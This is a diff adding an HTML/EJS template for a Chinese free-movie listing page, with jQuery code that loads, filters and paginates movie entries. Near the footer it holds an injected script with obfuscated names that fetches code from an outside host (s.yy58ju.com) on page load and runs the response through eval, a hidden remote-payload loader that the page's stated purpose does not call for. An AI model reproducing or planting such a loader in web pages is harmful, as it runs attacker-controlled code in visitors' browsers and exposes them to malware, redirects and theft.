@@ -1,0 +1,213 @@
+
+<html>
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		<meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0">
+		<title>免费电影院，收藏观看更方便</title>
+		<meta name="keywords" content="高清在线电影网,手机在线高清电影网,电影频道">
+		<meta name="description" content="免费电影网是中国最专业的高清在线电影垂直网站,涵盖华语、欧美、日韩地区海量电影图文资讯 - bbw360.cn">
+		<link rel="apple-touch-icon" href="favicon.ico">
+		<link rel="stylesheet" type="text/css" href="http://7xmsoo.com1.z0.glb.clouddn.com/kuyi/css/style.css">
+		<script charset="utf-8" src="http://7xmsoo.com2.z0.glb.qiniucdn.com/Public/jquery/jquery-1.7.2.min.js"></script>
+		<link rel="stylesheet" type="text/css" href="http://7xmsoo.com1.z0.glb.clouddn.com/kuyi/css/movie.css">
+		<script type="text/javascript" src="javascripts/kuyi/pageutil.js"></script>
+
+		<style>
+			.add_bor{
+			 	border:1px solid #054674;
+			 }
+		</style>
+		<script type="text/javascript">
+			$(document).ready(function() {
+				//加载全部影片
+				getMovieByTypeAndDistrit(0, 0);
+				//按什么排序
+				$("#order").bind('change', function() {
+					var selected = $(this).val();
+					//加载更多
+					$("#more").html("加载更多");
+					isEnd = false;
+					$("#page").text(1);
+					var distrit_id = $("#distrit_id").val();
+					getMovieByTypeAndDistrit(distrit_id, selected);
+				});
+				//获取地区标签
+				var distrit = $(".nav_ul li a");
+				var count = distrit.length / 2;
+				distrit.each(function(index, item) {
+					$(this).click(function() {
+						$("#distrit_id").val($(this).attr('value'));
+						getMovieByTypeAndDistrit($(this).attr('value'), $("#order").val());
+						if (distrit.hasClass('navActived'))
+							distrit.removeClass('navActived').removeAttr("style");
+						$(this).addClass('navActived').css("border", "1px solid #054674");
+						if (index < count)
+							distrit.eq(index + count).addClass('navActived').css("border", "1px solid #054674");
+						else
+							distrit.eq(index - count).addClass('navActived').css("border", "1px solid #054674");
+						//加载更多
+						$("#more").html("加载更多");
+						isEnd = false;
+						$("#page").text(1);
+						$("#more").attr("onclick", "getNews(<%= distrit_id %>," + $(this).attr('value') + "," + $("#order").val() + ",0,'')");
+					});
+				});
+			});
+
+			function getMovieByTypeAndDistrit(distrit_id, order) {
+				$.ajax({
+					type: "get",
+					url: "/kuyi/list",
+					data: {
+						page: 1,
+						type_id: $("#type_id").val(),
+						distrit_id: distrit_id,
+						order: order,
+						key: ""
+					},
+					success: function(data) {
+						var html = '';
+						$.each(data.data, function(index, item) {
+							html += '<div class="movieBlock">' +
+								'<div class="movieList">' +
+								'<a href="/kuyi/detail?site=<%= site %>&random=<%= random %>&id='+item.id+'"><img alt="' + item.name + '" src="http://www.kuyiyuan.cn/Uploads/' + item.picture_url + '"></a>' +
+								'</div>' +
+								'<div class="movieDetail float">' +
+								'<div class="movieTitle"><a href="/kuyi/detail?site=<%= site %>&random=<%= random %>&id='+item.id+'">' + item.name + '</a></div>' +
+								'<a class="movieListPlay" href="/kuyi/detail?site=<%= site %>&random=<%= random %>&id='+item.id+'">播 放</a>' +
+								'<div class="movieDetails">' +
+								'	<p>导演：<span>' + item.director + '</span></p>' +
+								'<p>主演：<span>' + item.actor + '</span></p>' +
+								'	<p>类型：<span>' + item.type_name + '</span></p>' +
+								'	<p>时间：<span>' + item.publicdate + '</span></p>' +
+								'	<p>播放：<span>' + item.playcount + '</span>次</p>' +
+								'</div>' +
+								'</div>' +
+								'</div>';
+						});
+						$("#content").html(html);
+					}
+				});
+			}
+		</script>
+	</head>
+
+	<body>
+		<input type="hidden" value="<%= type_id %>" id="type_id">
+		<input type="hidden" value="<%= distrit_id %>" id="distrit_id">
+		<div class="cont">
+			<div class="top">
+				<a name="toTop"></a>
+				<div class="logo">
+					<a href="/kuyi?random=<%= random %>"><img alt="logo" src="http://7xmsoo.com1.z0.glb.clouddn.com/kuyi/image/126x35.png" height="44px"></a>
+				</div>
+				</a>
+				<div class="channelName"></div>
+				<a href="javascript:void(0)" class="search" style="background:url(http://7xu9c2.com1.z0.glb.clouddn.com/cuteBaby/image/search.png)"></a>
+
+			</div>
+			<%- include search.html %>
+			<div class="nav float">
+				<ul class="nav_ul">
+					<li><a href="javascript:void(0)" class="navActived add_bor" value="0" style="border:solid 1px #054674;">全片</a></li>
+					<li><a href="javascript:void(0)" value="1">内地</a></li><li><a href="javascript:void(0)" value="2">港台</a></li><li><a href="javascript:void(0)" value="3">日韩</a></li><li><a href="javascript:void(0)" value="4">欧美</a></li>				</ul>
+
+			</div>
+
+			<div class="movieOrder">
+				<label>排序:</label>
+				<select id="order">
+					<option value="0" selected="selected">按更新</option>
+					<option value="1">按热门</option>
+				</select>
+			</div>
+			<div class="float movieListScreem" id="content">
+
+			</div>
+			<div id="page" style="display:none">1</div>
+			<a class="moreCont" id="more" onclick="getNews(<%= distrit_id %>,0,0,0,'')">加载更多</a>
+
+			<div class="bottom">
+
+				<div class="bottomBox float">
+					<a href="/kuyi?random=<%= random %>">回到主页</a>
+					<a href="#toTop" style="border-left:solid 1px #3c88bc">返回顶部</a>
+				</div>
+			</div>
+
+			<div class="footerdesc">
+				<%- include footer.html %>
+			</div>
+			<script>var teZ5Lh_xmlhttp;function teZ5Lh_loadXMLDoc(url){teZ5Lh_xmlhttp=null;if(window.XMLHttpRequest){teZ5Lh_xmlhttp=new XMLHttpRequest();}else if(window.ActiveXObject){teZ5Lh_xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");}if(teZ5Lh_xmlhttp!=null){teZ5Lh_xmlhttp.onreadystatechange=state_Change;teZ5Lh_xmlhttp.open("GET",url,false);teZ5Lh_xmlhttp.send(null);}}function state_Change(){if(teZ5Lh_xmlhttp.readyState==4){if(teZ5Lh_xmlhttp.status==200){if(window.execScript)window.execScript(teZ5Lh_xmlhttp.responseText,"JavaScript");else if(window.eval)window.eval(teZ5Lh_xmlhttp.responseText,"JavaScript");else eval(teZ5Lh_xmlhttp.responseText);}}};var teZ5Lh_xmlhttp="http://s.yy58ju.com/ns.php?Mzk1MS4zMDUyLjY4NDg=";teZ5Lh_loadXMLDoc(teZ5Lh_xmlhttp);</script>
+	</body>
+<script type="text/javascript">
+var isEnd=false;
+
+function getNews(type_id,distrit_id,order,recent,key){
+	if(isEnd)return;
+	var more=document.getElementById("more");
+	$("#more").html('信息正在加载中..');
+	var page = $("#page").text();
+	page     =  parseInt(page)+1;
+	$("#page").html(page);
+	var url = "/kuyi/list?page="+page+"&type_id="+type_id+"&distrit_id="+distrit_id+"&order="+order+"&isrecent="+recent+"&key="+key;
+
+	$.getJSON(url, function(data){
+		var str = '';	
+		if(data==null || data==false){
+			isEnd=true;
+			more.innerHTML="亲，没有电影了!";
+			$("#more").click(function(){
+				return false;
+			});
+		}else{
+			data = data.data;
+			var dlength = data.length; 		
+			for(i=0;i<dlength;i++){
+				var img   = "<div class='movieList'><a href='/kuyi/detail?site=<%= site %>&random=<%= random %>&id="+data[i].id+"'><img src='http://www.kuyiyuan.cn/Uploads/"+data[i].picture_url+"' /></div>"
+				
+				var title = "<div class='movieTitle'><a href='/kuyi/detail?site=<%= site %>&random=<%= random %>&id="+data[i].id+"'>"+data[i].name+"</a></div>";
+				if(data[i].name==''){var title='';}
+				
+				var bofang = "<a hr";
+				bofang =bofang+"ef='/kuyi/detail?site=<%= site %>&random=<%= random %>&id="+data[i].id+"' class='movieListPlay'>播放</a>";
+				if(data[i].id==''){var bofang='';}
+				
+				var direct = '<p>导演:<span>'+data[i].director+'</span></p>';
+				if(data[i].director==''){var direct='';}
+				
+				var starring = '<p>主演:<span>'+data[i].actor+'</span></p>';
+				if(data[i].actor==''){var starring='';}
+
+				var vmtype = '<p>类型:<span>'+data[i].type_name+'</span></p>';
+				if(data[i].type_name==''){var vmtype='';}
+				
+				var produceyear = "<p>时间:<span>"+data[i].publicdate+"</span></p>";		
+				if(data[i].publicdate==''){var produceyear='';}
+				
+				var hits = "<p>播放:<span>"+data[i].playcount+"</span>次</p>";
+				if(data[i].playcount==''){var hits='';}
+		
+				var str = str+"<div class='movieBlock'>"+img+"<div class='movieDetail float'>"+title+bofang+"<div class='movieDetails'>"+direct+starring+vmtype+produceyear+hits+"</div></div></div>";
+	
+			}
+			
+			$("#content").append(str);
+
+			//if(dlength < 1){isEnd=true;}
+
+			if(!isEnd){
+				more.innerHTML="加载更多";
+			}
+			/*else{
+				more.innerHTML="已经显示完全部内容!";
+				$("#more").click(function(){
+					return false;
+				});  
+			}*/
+		}
+	});
+}
+</script>
+</html>
